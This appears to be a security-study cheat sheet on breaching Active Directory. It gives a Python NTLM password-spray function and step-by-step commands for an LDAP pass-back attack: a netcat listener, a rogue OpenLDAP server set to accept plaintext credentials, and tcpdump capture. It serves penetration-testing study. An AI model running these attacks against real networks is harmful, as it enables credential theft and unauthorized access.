---
permalink: /breaching-active-directory.html
title: Breaching Active Directory
description: 
---
<head>
<link href="css/cyber.css" rel="stylesheet">
</head>

[Toolkit Homepage](../README.md)

### Active Directory Breaching

* Techniques for breaching AD
* NTLM Authenticated Services
* LDAP Bind Credentials
* Authentication Relays
* Microsoft Deployment Toolkit
* Configuration Files
* Phishing
* OSINT services for finding AD credentials
  * <https://stackoverflow.com/>
  * <https://github.com/>
  * Past breach credentials:
    * <https://haveibeenpwned.com/>
    * <https://www.dehashed.com/>

* NTLM and NetNTLM
  * HetHTLM services exposed to internet:
    * On-premises Exchange/Outlook OWA
    * RDP
    * AD integrated VPN endpoints
    * Internet facing web apps
* Password spray script:

```python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

* LDAP: application directly verifies user's credentials via a pair of AD credentials
  * Attempt to recover the AD credentials used by the service to gain authenticated access to AD
  * Common LDAP services:
    * Gitlab
    * Jenkins
    * Custom-developed web applications
    * Printers
    * VPNs
* LDAP Pass-back Attacks
  * Redirecting the LDAP server request in order to intercept the LDAP credentials
  * Use netcat listener while sending LDAP request: `nc -lvp 389`
  * Hosting a Rogue LDAP Server
    * Install OpenLDAP: `sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
    * Configure server: `sudo dpkg-reconfigure -p low slapd`
    * Create olcSaslSecProps.ldif file with:

```bash 
    #olcSaslSecProps.ldif
    dn: cn=config
    replace: olcSaslSecProps
    olcSaslSecProps: noanonymous,minssf=0,passcred
```

* Patch LDAP server: `sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
* Test if configuration has been applied: `ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms`
* Run tcpdump to grab credentials: `sudo tcpdump -SX -i breachad tcp port 389`
* Run the test LDAP credentials in the GUI
